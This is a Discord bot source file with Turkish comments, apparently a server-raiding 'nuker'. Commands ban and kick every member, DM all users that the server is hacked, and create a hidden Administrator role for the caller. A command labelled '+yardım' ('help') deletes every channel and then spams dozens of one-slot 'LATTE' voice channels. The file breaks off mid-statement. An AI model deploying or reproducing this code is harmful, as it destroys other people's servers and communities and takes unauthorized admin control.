const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("kapatıldı kanki", {
      type: "text"
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
